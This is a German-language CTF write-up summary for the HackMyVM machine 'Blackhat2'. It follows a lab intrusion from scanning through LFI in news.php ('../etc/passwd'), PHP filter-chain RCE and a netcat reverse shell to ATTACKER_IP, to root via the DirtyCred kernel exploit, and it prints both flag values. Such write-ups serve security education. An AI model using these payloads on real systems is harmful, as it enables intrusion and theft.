# Blackhat2 - HackMyVM Writeup

![Blackhat2 VM Icon](Blackhat2.png)

Dieses Repository enthält das Writeup für die HackMyVM-Maschine "Blackhat2" (Schwierigkeitsgrad: Medium), erstellt von DarkSpirit. Ziel war es, initialen Zugriff auf die virtuelle Maschine zu erlangen und die Berechtigungen bis zum Root-Benutzer zu eskalieren.

## VM-Informationen

*   **VM Name:** Blackhat2
*   **Plattform:** HackMyVM
*   **Autor der VM:** DarkSpirit
*   **Schwierigkeitsgrad:** Medium
*   **Link zur VM:** [https://hackmyvm.eu/machines/machine.php?vm=Blackhat2](https://hackmyvm.eu/machines/machine.php?vm=Blackhat2)

## Writeup-Informationen

*   **Autor des Writeups:** Ben C.
*   **Datum des Berichts:** 02. Mai 2024
*   **Link zum Original-Writeup (GitHub Pages):** [https://alientec1908.github.io/Blackhat2_HackMyVM_Medium/](https://alientec1908.github.io/Blackhat2_HackMyVM_Medium/)

## Kurzübersicht des Angriffspfads

Der Angriff auf die Blackhat2-Maschine umfasste die folgenden Schritte:

1.  **Reconnaissance:**
    *   Identifizierung der Ziel-IP (`192.168.2.118` unter dem Hostnamen `blackhat2.hmv`) mittels `arp-scan`.
    *   Ein `nmap`-Scan offenbarte zwei offene Ports: SSH (22, OpenSSH 9.2p1) und HTTP (80, Apache 2.4.57, Titel "Home - Hacked By sML").
2.  **Web Enumeration:**
    *   `nikto` und `dirb`/`gobuster` wurden zur Enumeration des Webservers auf Port 80 eingesetzt.
    *   Wichtige Funde waren `index.php`, `news.php` und Verzeichnisse wie `2021`, `2022`, `2023`. Nikto wies auf ein unsicheres `PHPSESSID`-Cookie bei `news.php` hin.
3.  **Vulnerability Analysis (LFI/RCE):**
    *   `sqlmap` auf den `year`-Parameter von `news.php` schlug fehl, SQL-Injection war hier nicht der Weg.
    *   `wfuzz` wurde verwendet, um weitere GET-Parameter für `news.php` zu finden und identifizierte `email` als relevanten Parameter.
    *   Eine Local File Inclusion (LFI)-Schwachstelle wurde im `year`-Parameter von `news.php` entdeckt (`news.php?year=../../../../../../../etc/passwd`).
    *   Um RCE zu erlangen, wurde das Tool `php_filter_chain_generator.py` verwendet, um einen Payload für den `php://filter`-Wrapper zu erstellen. Das Ziel war die Ausführung von ``.
4.  **Initial Access (RCE via PHP Filter Chain):**
    *   Die generierte PHP-Filterkette wurde im `year`-Parameter von `news.php` verwendet, zusammen mit einem `&cmd=`-Parameter, um Befehle auszuführen.
    *   Mit `cmd=id` wurde RCE als `www-data` bestätigt.
    *   Eine Netcat-Reverse-Shell (`cmd=nc -e /bin/bash [ATTACKER_IP] [PORT]`) wurde erfolgreich initiiert, was zu einer Shell als `www-data` führte.
5.  **Privilege Escalation (Kernel Exploit - DirtyCred):**
    *   Als `www-data` wurden grundlegende Enumerationsschritte durchgeführt.
    *   Der Kernel-Exploit `ExploitGSM` (wahrscheinlich für CVE-2022-2588, "DirtyCred") wurde von GitHub geklont, kompiliert und auf das Zielsystem übertragen.
    *   Die Ausführung von `./ExploitGSM` im `/tmp`-Verzeichnis führte erfolgreich zur Privilegieneskalation zu `root`.
6.  **Flags:**
    *   Die User-Flag (`/home/sml/user.txt`) wurde als `root` gelesen.
    *   Die Root-Flag (`/root/root.txt`) wurde als `root` gelesen.

## Verwendete Tools

*   `arp-scan`
*   `vi`
*   `nmap`
*   `nikto`
*   `dirb`
*   `gobuster`
*   `sqlmap`
*   `curl`
*   `wfuzz`
*   `ffuf` (im Text, aber evtl. Verwechslung mit wfuzz)
*   `python3` (Filter Chain Generator, HTTP Server)
*   `nc` (netcat)
*   `ls`
*   `git`
*   `cmake`
*   `make`
*   `wget`
*   `chmod`
*   `cat`
*   `grep`
*   `dmesg`
*   `sysctl`
*   `linpeas.sh`
*   `pspy64`
*   `ExploitGSM` (DirtyCred Exploit)

## Identifizierte Schwachstellen (Zusammenfassung)

*   **Local File Inclusion (LFI):** Der `year`-Parameter in `news.php` war anfällig für LFI, was das Auslesen beliebiger Dateien ermöglichte.
*   **Remote Code Execution (RCE) via PHP Filter Chain:** Die LFI-Schwachstelle konnte mittels einer komplexen PHP-Filterkette und dem `php://filter`-Wrapper zu RCE eskaliert werden.
*   **Veralteter Linux-Kernel (Version 6.1.0-18):** Anfällig für den "DirtyCred"-Exploit (CVE-2022-2588), der eine Privilegieneskalation von `www-data` zu `root` ermöglichte.

## Flags

*   **User Flag (`/home/sml/user.txt`):** `156532dab679edf6f8e53c8787a09264`
*   **Root Flag (`/root/root.txt`):** `30f55e2f86961a07e3a181a82f602ed6`

---

**Wichtiger Hinweis:** Dieses Dokument und die darin enthaltenen Informationen dienen ausschließlich zu Bildungs- und Forschungszwecken im Bereich der Cybersicherheit. Die beschriebenen Techniken und Werkzeuge sollten nur in legalen und autorisierten Umgebungen (z.B. eigenen Testlaboren, CTFs oder mit expliziter Genehmigung) angewendet werden. Das unbefugte Eindringen in fremde Computersysteme ist eine Straftat und kann rechtliche Konsequenzen nach sich ziehen.

---
*Bericht von Ben C. - Cyber Security Reports*
